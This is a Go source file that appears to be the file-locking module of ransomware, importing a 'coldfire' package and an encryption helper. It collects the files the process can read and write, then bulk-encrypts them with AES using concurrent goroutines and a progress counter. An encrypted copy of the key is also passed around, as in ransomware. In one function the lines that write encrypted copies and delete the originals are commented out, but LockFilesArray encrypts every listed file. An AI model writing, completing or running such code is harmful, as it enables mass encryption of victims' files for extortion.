package file

import (
	"fmt"
	"os"
	"runtime"
	"sync"

	cf "frostbite.com/coldfire"
	enc "frostbite.com/encryption"
	scan "frostbite.com/tools/scan"
)

var pl = fmt.Println

func LockFilesInDir(startDirPath string, skipHiddenDirs bool, encryptedAESKey []byte, AESKey []byte) {
	//scan only non hidden directories
	runtime.GOMAXPROCS(runtime.NumCPU() / 2)
	// filesToEncrypt := ScanFilesInDirWithLockAdd(startDirPath, skipHiddenDirs, encryptedAESKey)
	filesToEncrypt, _ := scan.ScanNoSideEffects(startDirPath, skipHiddenDirs)

	wg := sync.WaitGroup{}
	wg.Add(len(filesToEncrypt))

	for _, filePath := range filesToEncrypt {
		go func(filePath string) {
			// encryptedFileData := enc.EncryptFileAES(AESKey, filePath)
			// os.WriteFile(filePath+".enc", encryptedFileData, 0644)
			// os.Remove(filePath)
			wg.Done()
		}(filePath)
	}
	wg.Wait()

}

func RunEncryptForCurrentDir(encryptedAESKey []byte, AESKey []byte) (fileList []string) {

	//get pwd
	currentDir, err := os.Getwd()
	ErrCheck(err)
	// LockFilesInDir(currentDir, true, encryptedAESKey, AESKey)
	pl("current dir: ", currentDir)
	return fileList
}

func GetListOfAccessibleFiles(fileList []string) []string {
	ch := make(chan string)
	wg := sync.WaitGroup{}
	wg.Add(len(fileList))

	fileListWithAccess := make([]string, 0)
	for _, file := range fileList {
		go func(file string, ch chan string) {
			read, write := cf.FilePermissions(file)
			if read && write {
				ch <- file
			}
			wg.Done()
		}(file, ch)
	}

	go func() {
		wg.Wait()
		close(ch)
	}()

	for file := range ch {
		fileListWithAccess = append(fileListWithAccess, file)
	}
	return fileListWithAccess
}

func LockFilesArray(filesToEncrypt []string, AESKey []byte, encryptedAESKey []byte) {
	//scan only non hidden directories

	// runtime.GOMAXPROCS(16)
	numCPU := runtime.NumCPU()
	runtime.GOMAXPROCS(numCPU - 2)

	wg := sync.WaitGroup{}

	// limit the number of goroutines
	concurrencyLimit := numCPU * 2
	filesProcessed := 0
	for i := 0; i < len(filesToEncrypt); i += concurrencyLimit {
		// wait until there's room for another goroutine to start
		for j := 0; j < concurrencyLimit && i+j < len(filesToEncrypt); j++ {
			wg.Add(1)
			go func(index int) {
				defer wg.Done()
				_ = enc.EncryptFileAES(AESKey, filesToEncrypt[index])
				//append file path to file named "encryptedFiles.txt"
				filesProcessed++
			}(i + j)
		}

		//log the progress in percent
		percent := (float64(i) / float64(len(filesToEncrypt))) * 100
		//print progress in percent, limit to 2 decimal places
		fmt.Printf("Progress: %.2f%%\r", percent)
		wg.Wait()
	}
	pl("Files processed: ", filesProcessed)
}
